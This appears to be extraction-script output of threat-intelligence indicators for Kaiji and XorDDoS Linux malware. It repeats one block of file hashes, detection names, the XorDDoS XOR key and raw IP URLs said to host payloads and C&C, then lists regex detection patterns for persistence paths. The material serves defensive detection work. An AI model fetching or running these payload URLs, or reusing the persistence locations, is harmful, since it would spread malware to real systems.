+the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.
+---
+en_verb: find, m.word: http://62.171.160.189/linux_arm, sent: 
+indicators of compromise
+kaiji
+
+file name	sha 256	trend micro pattern detection
+123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
+linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
+related urls:
+
+http://62.171.160.189/linux_arm
+http://62.171.160.189/11/123.sh
+xorddos and other malware variants found through the same url
+
+sha 256	trend micro pattern detection
+dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
+6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
+286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
+related url:
+
+http://122.51.133.49:10086/vip
+---
+en_verb: find, m.word: http://62.171.160.189/11/123.sh, sent: 
+indicators of compromise
+kaiji
+
+file name	sha 256	trend micro pattern detection
+123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
+linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
+related urls:
+
+http://62.171.160.189/linux_arm
+http://62.171.160.189/11/123.sh
+xorddos and other malware variants found through the same url
+
+sha 256	trend micro pattern detection
+dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
+6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
+286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
+related url:
+
+http://122.51.133.49:10086/vip
+---
+en_verb: find, m.word: http://122.51.133.49:10086/vip, sent: 
+indicators of compromise
+kaiji
+
+file name	sha 256	trend micro pattern detection
+123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
+linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
+related urls:
+
+http://62.171.160.189/linux_arm
+http://62.171.160.189/11/123.sh
+xorddos and other malware variants found through the same url
+
+sha 256	trend micro pattern detection
+dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
+6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
+286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
+related url:
+
+http://122.51.133.49:10086/vip
+Xorddos-Cdnetworks.csv set()
+Xorddos-Crowdstrike.csv set()
+Xorddos-Intezer.csv {'UID(\\$|\\.|$)', 'GID(\\$|\\.|$)', '/etc/rc', '/proc/', '/etc/init.d/', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+Xorddos-Microsoft.csv {'/run/', '/var/', 'GID(\\$|\\.|$)', '/proc/rs_dev', '/proc/', '/etc/rc', '^sh$', '/etc/init.d/', '/var/run/', 'update-rc.d', '/etc/cron', '[a-zA-z]:\\d{1,5}$', '^chkconfig$', '0x[0-9a-zA-Z]{8}'}
+Xorddos-Trendmicro.csv {'/run/', '/var/', '/etc/rc', '/var/run/', '/etc/cron', '[a-zA-z]:\\d{1,5}$'}
+Xorddos-Trendmicro2.csv {'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
